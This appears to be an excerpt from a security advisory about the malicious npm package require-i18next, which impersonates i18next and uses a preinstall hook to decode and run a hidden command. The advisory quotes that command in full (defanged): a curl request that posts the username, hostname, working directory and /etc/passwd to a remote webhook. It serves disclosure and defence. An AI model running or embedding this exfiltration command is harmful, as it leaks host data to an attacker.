  "summary": "Malicious code in require-i18next (npm)",
  "details": "The preinstall hook (node preinstall.js) reads a hex-encoded command from a bundled preinstall.json, decodes it, and executes it with child_process.exec. The decoded command runs `curl hxxps://eobdzec83knbura[.]m[.]pipedream[.]net -d \"whoami=`whoami`\u0026pwd=`pwd`\u0026hostname=`hostname`\u0026passwd=`cat /etc/passwd`\"`, POSTing the host's username, working directory, hostname, and the contents of /etc/passwd to a remote pipedream[.]net webhook endpoint during installation. The package name impersonates the legitimate i18next library.",
